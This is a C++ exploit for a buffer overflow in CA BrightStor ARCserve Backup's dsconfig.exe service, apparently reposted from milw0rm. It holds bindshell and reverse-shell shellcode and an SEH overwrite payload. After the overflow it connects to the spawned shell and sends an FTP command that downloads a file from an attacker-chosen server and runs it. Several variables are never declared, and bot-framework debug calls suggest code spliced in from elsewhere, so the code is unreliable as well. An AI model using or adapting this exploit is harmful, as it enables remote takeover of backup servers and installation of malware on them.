// Ref: http://www.milw0rm.com/id.php?id=815 /str0ke

/*
 * CA BrightStor ARCserve Backup Buffer Overflow - dsconfig.exe
 *
 * cybertronic[at]gmx[dot]net
 *
 */
/*
#include <iostream>
#include <windows.h>

using namespace std;

#define PORT	41523

unsigned char bindshell[] =
	"\x29\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x19"
	"\xf5\x04\x37\x83\xeb\xfc\xe2\xf4\xe5\x9f\xef\x7a\xf1\x0c\xfb\xc8"
	"\xe6\x95\x8f\x5b\x3d\xd1\x8f\x72\x25\x7e\x78\x32\x61\xf4\xeb\xbc"
	"\x56\xed\x8f\x68\x39\xf4\xef\x7e\x92\xc1\x8f\x36\xf7\xc4\xc4\xae"
	"\xb5\x71\xc4\x43\x1e\x34\xce\x3a\x18\x37\xef\xc3\x22\xa1\x20\x1f"
	"\x6c\x10\x8f\x68\x3d\xf4\xef\x51\x92\xf9\x4f\xbc\x46\xe9\x05\xdc"
	"\x1a\xd9\x8f\xbe\x75\xd1\x18\x56\xda\xc4\xdf\x53\x92\xb6\x34\xbc"
	"\x59\xf9\x8f\x47\x05\x58\x8f\x77\x11\xab\x6c\xb9\x57\xfb\xe8\x67"
	"\xe6\x23\x62\x64\x7f\x9d\x37\x05\x71\x82\x77\x05\x46\xa1\xfb\xe7"
	"\x71\x3e\xe9\xcb\x22\xa5\xfb\xe1\x46\x7c\xe1\x51\x98\x18\x0c\x35"
	"\x4c\x9f\x06\xc8\xc9\x9d\xdd\x3e\xec\x58\x53\xc8\xcf\xa6\x57\x64"
	"\x4a\xa6\x47\x64\x5a\xa6\xfb\xe7\x7f\x9d\x1a\x55\x7f\xa6\x8d\xd6"
	"\x8c\x9d\xa0\x2d\x69\x32\x53\xc8\xcf\x9f\x14\x66\x4c\x0a\xd4\x5f"
	"\xbd\x58\x2a\xde\x4e\x0a\xd2\x64\x4c\x0a\xd4\x5f\xfc\xbc\x82\x7e"
	"\x4e\x0a\xd2\x67\x4d\xa1\x51\xc8\xc9\x66\x6c\xd0\x60\x33\x7d\x60"
	"\xe6\x23\x51\xc8\xc9\x93\x6e\x53\x7f\x9d\x67\x5a\x90\x10\x6e\x67"
	"\x40\xdc\xc8\xbe\xfe\x9f\x40\xbe\xfb\xc4\xc4\xc4\xb3\x0b\x46\x1a"
	"\xe7\xb7\x28\xa4\x94\x8f\x3c\x9c\xb2\x5e\x6c\x45\xe7\x46\x12\xc8"
	"\x6c\xb1\xfb\xe1\x42\xa2\x56\x66\x48\xa4\x6e\x36\x48\xa4\x51\x66"
	"\xe6\x25\x6c\x9a\xc0\xf0\xca\x64\xe6\x23\x6e\xc8\xe6\xc2\xfb\xe7"
	"\x92\xa2\xf8\xb4\xdd\x91\xfb\xe1\x4b\x0a\xd4\x5f\xf6\x3b\xe4\x57"
	"\x4a\x0a\xd2\xc8\xc9\xf5\x04\x37";

unsigned char reverseshell[] =
"\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\x99\xE2\xFA"
"\xEB\x05\xE8\xEB\xFF\xFF\xFF\x70\x62\x99\x99\x99\xC6\xFD\x38\xA9"
"\x99\x99\x99\x12\xD9\x95\x12\xE9\x85\x34\x12\xF1\x91\x12\x6E\xF3"
"\x9D\xC0\x71\x02\x99\x99\x99\x7B\x60\xF1\xAA\xAB\x99\x99\xF1\xEE"
"\xEA\xAB\xC6\xCD\x66\x8F\x12\x71\xF3\x9D\xC0\x71\x1B\x99\x99\x99"
"\x7B\x60\x18\x75\x09\x98\x99\x99\xCD\xF1\x98\x98\x99\x99\x66\xCF"
"\x89\xC9\xC9\xC9\xC9\xD9\xC9\xD9\xC9\x66\xCF\x8D\x12\x41\xF1\xE6"
"\x99\x99\x98\xF1\x9B\x99\x9D\x4B\x12\x55\xF3\x89\xC8\xCA\x66\xCF"
"\x81\x1C\x59\xEC\xD3\xF1\xFA\xF4\xFD\x99\x10\xFF\xA9\x1A\x75\xCD"
"\x14\xA5\xBD\xF3\x8C\xC0\x32\x7B\x64\x5F\xDD\xBD\x89\xDD\x67\xDD"
"\xBD\xA4\x10\xC5\xBD\xD1\x10\xC5\xBD\xD5\x10\xC5\xBD\xC9\x14\xDD"
"\xBD\x89\xCD\xC9\xC8\xC8\xC8\xF3\x98\xC8\xC8\x66\xEF\xA9\xC8\x66"
"\xCF\x9D\x12\x55\xF3\x66\x66\xA8\x66\xCF\x91\xCA\x66\xCF\x85\x66"
"\xCF\x95\xC8\xCF\x12\xDC\xA5\x12\xCD\xB1\xE1\x9A\x4C\xCB\x12\xEB"
"\xB9\x9A\x6C\xAA\x50\xD0\xD8\x34\x9A\x5C\xAA\x42\x96\x27\x89\xA3"
"\x4F\xED\x91\x58\x52\x94\x9A\x43\xD9\x72\x68\xA2\x86\xEC\x7E\xC3"
"\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D"
"\x12\x9A\x5C\x32\xC7\xC0\x5A\x71\x99\x66\x66\x66\x17\xD7\x97\x75"
"\xEB\x67\x2A\x8F\x34\x40\x9C\x57\x76\x57\x79\xF9\x52\x74\x65\xA2"
"\x40\x90\x6C\x34\x75\x60\x33\xF9\x7E\xE0\x5F\xE0";


#define SET_PORTBIND_PORT(buf, port) \
	*(unsigned short *)(((buf)+186)) = (port)

void
exploit ( SOCKET s, unsigned long cbip, unsigned short cbport, int option )
{
	char buffer[4129];
	unsigned long poppopret = 0x23805714;

	ZeroMemory ( &buffer, sizeof ( buffer ) );
	memset ( buffer, 0x41, sizeof ( buffer ) - 1 );

	buffer[0] = 0x9b;
	buffer[1] = 0x53; //S
	buffer[2] = 0x45; //E
	buffer[3] = 0x52; //R
	buffer[4] = 0x56; //V
	buffer[5] = 0x49; //I
	buffer[6] = 0x43; //C
	buffer[7] = 0x45; //E
	buffer[8] = 0x50; //P
	buffer[9] = 0x43; //C
	buffer[10] = 0x18;
	buffer[11] = 0x01;
	buffer[12] = 0x02;
	buffer[13] = 0x03;
	buffer[14] = 0x04;
	buffer[15] = 0x53; //S
	buffer[16] = 0x45; //E
	buffer[17] = 0x52; //R
	buffer[18] = 0x56; //V
	buffer[19] = 0x49; //I
	buffer[20] = 0x43; //C
	buffer[21] = 0x45; //E
	buffer[22] = 0x50; //P
	buffer[23] = 0x43; //C
	buffer[24] = 0x01;
	buffer[25] = 0x0c;
	buffer[26] = 0x6c;
	buffer[27] = 0x93;
	buffer[28] = 0xce;
	buffer[29] = 0x18;
	buffer[30] = 0x18;

	memcpy ( buffer + 1056, "\xeb\x06", 2 );
	memcpy ( buffer + 1060, "\x14\x57\x80\x23", 4 );
	if ( option == 0 )
	{
		memcpy ( &reverseshell[111], &cbip, 4);
		memcpy ( &reverseshell[118], &cbport, 2);
		memcpy ( buffer + 1064, reverseshell, sizeof ( reverseshell ) - 1 );
	}
	else {
//		unsigned short bindport = 1337;
//		bindport ^= 0x0437;
	//	SET_PORTBIND_PORT(bindshell, htons(bindport));
	//	memcpy(ptr, bind_shellcode, sizeof(bind_shellcode)-1);

		memcpy ( buffer + 1064, bindshell, sizeof ( bindshell ) - 1 );
	}

	cout << "[*] Attacking with " << strlen(buffer) << " bytes..." << endl;
	if (send( s, buffer, strlen(buffer), 0) == SOCKET_ERROR)
		cout << "[-] send failed" << endl;
	recv(s, buffer, 1024, 0);
	cout << "[*] Exploit send successfull" << endl;
	closesocket(s);
	Sleep(5000);

	memset(&shell_addr, 0, sizeof(shell_addr));
		
	shell_addr.sin_family = AF_INET;
	shell_addr.sin_addr.S_un.S_addr = inet_addr(exinfo.ip);
	shell_addr.sin_port = htons(1337);;

	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET ) 
		return false;
#ifdef DEBUG_MODE
	vPOEb->DebugPrint("msmq",con::fg_green,"Connecting to shell");
#endif // DEBUGMODE
	if (connect(sockfd, (LPSOCKADDR)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) {
#ifdef DEBUG_MODE
	vPOEb->DebugPrint("msmq",con::fg_green,"Can't connect to shell");
#endif // DEBUGMODE
		return false;
	}
	
	memset(recvbuf, 0, sizeof(recvbuf));
	len = recv(sockfd, recvbuf, 1024, 0);
	Sleep(1000);
	_snprintf(mkdir_buff, sizeof (mkdir_buff),
		"echo open %s %d >> kernel32&echo user %s %s >> kernel32 &echo type binary >> kernel32 &echo get %s >> kernel32 &echo quit >> kernel32 &ftp -n -s:kernel32 &%s\r\n", lsaip, lsaport, lsuser, lspass, filename, filename);
	if (send(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
		return false;

	len = recv(sockfd, recvbuf, 1024, 0);
	closesocket(sockfd);
}

int
main ( int argc, char* argv[] )
{
	SOCKET s; WSADATA wsa;
	unsigned long cbip;
	unsigned short cbport;
	struct sockaddr_in remote_addr;
	struct hostent* host_addr;

	WSADATA initSock;

	if ( argc != 2 )
		if ( argc != 4 )
			{ fprintf ( stderr, "Usage\n-----\n[bindshell] %s <ip>\n[reverseshell] %s <ip> <cbip> <cbport>\n", argv[0], argv[0] ); exit ( 1 ); }

	if (WSAStartup(MAKEWORD(2,0), &initSock)) {   
		cout << "[-] WSAStartup failed" << endl;
	}
	if ( ( host_addr = gethostbyname ( argv[1] ) ) == NULL )
		{ fprintf ( stderr, "[-] Cannot resolve hostname: %s\n", argv[1] ); exit ( 1 ); }

	remote_addr.sin_family = AF_INET;
	remote_addr.sin_addr   = * ( ( struct in_addr * ) host_addr->h_addr );
	remote_addr.sin_port   = htons ( PORT );

	s = socket ( AF_INET, SOCK_STREAM, 0 );
	cout << "[*] Connecting to " << argv[1] << ":" << PORT << endl;
	if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
		{ cout << "[-] connect failed" << endl; exit ( 1 ); }
	printf ( "ok!\n" );

	if ( argc == 4 )
	{
		cbip = inet_addr ( argv[2] ) ^ ( unsigned long ) 0x99999999;
		cbport = htons ( atoi ( argv[3] ) ) ^ ( unsigned short ) 0x9999;
		exploit ( s, cbip, cbport, 0 );
	}
	else
		exploit ( s, ( unsigned long ) NULL, ( unsigned short ) NULL, 1 );
}
*/